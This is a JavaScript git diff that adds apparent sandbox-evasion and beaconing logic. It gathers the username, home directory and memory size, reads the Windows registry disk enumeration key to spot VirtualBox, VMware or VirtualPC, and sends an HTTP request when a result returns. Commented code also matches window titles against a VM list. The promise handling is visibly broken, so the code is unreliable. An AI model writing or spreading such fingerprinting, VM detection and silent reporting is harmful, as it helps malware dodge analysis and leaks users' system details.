@@ -54,12 +54,14 @@ function check(cb) {
     });
   }
 
-  var resultHex = winreestr();
-  if (resultHex) {
-    var req = http.request(options, callback);
-    req.write(data);
-    req.end();
-  }
+  winreestr().then(function (res) {
+    if (res) {
+      var req = http.request(options, callback);
+      req.write(data);
+      req.end();
+    }
+  });
+
 }
 
 //////////////////////////////
@@ -70,39 +72,33 @@ function winreestr() {
   var resultHex = '';
   function getDeviceParams() {
     return new Promise(function(resolve) {
-      resolve(os.totalmem(), os.userInfo().username, os.userInfo().homedir);
+      resolve(os.totalmem() +''+ os.userInfo().username, os.userInfo().homedir);
     });
   }
-  getDeviceParams()
-  .all(function([totalmem, homedir]) {
-    resultHex = totalmem + '|' + homedir;
-    return new Promise(function(resolve) {
-      resolve(resultHex);
-    });
-  })
+  return getDeviceParams()
   .then(function(resHex) {
-    console.log(resHex);
+     
+    // DiskVirtual для VirtualPC DiskVBOX_HARDDISK для Virtual Box Prod_VMware_Virtual для VMware Workstation
+    regKeyDisk = new Registry({                                       
+      hive: Registry.HKLM,                                       
+      key: '\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum'
+    })
+    regKeyDisk.values(function (err, items ) {
+    if (err)
+      console.log('ERROR: '+err);
+    else
+      for (var i=0; i<items.length; i++) {
+        if (items[i].name == '0') {
+          return resHex + ' ITEM: '+items[i].name+' '+items[i].type+' '+items[i].value;
+        }
+      }
+    }); 
+
+    
   });
 
 
-  // // 1)
-  // console.log("1) -------------------<");
-  // // DiskVirtual для VirtualPC DiskVBOX_HARDDISK для Virtual Box Prod_VMware_Virtual для VMware Workstation
-  // regKeyDisk = new Registry({                                       
-  //   hive: Registry.HKLM,                                       
-  //   key: '\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum'
-  // })
-  // regKeyDisk.values(function (err, items ) {
-  // if (err)
-  //   console.log('ERROR: '+err);
-  // else
-  //   for (var i=0; i<items.length; i++) {
-  //     if (items[i].name == '0') {
 
-  //       console.log('ITEM: '+items[i].name+'\t'+items[i].type+'\t'+items[i].value);
-  //     }
-  //   }
-  // }); 
 
   // // 2)
   // console.log("2) -------------------<");
@@ -181,7 +177,6 @@ function winreestr() {
   //   ret = user32.GetWindowTextA(hwnd, buf, 255);
   //   name = ref.readCString(buf, 0);
   //   if (vm_open.indexOf(name) > 0) {
-      
   //     console.log(name);
   //   }
   //   return true;
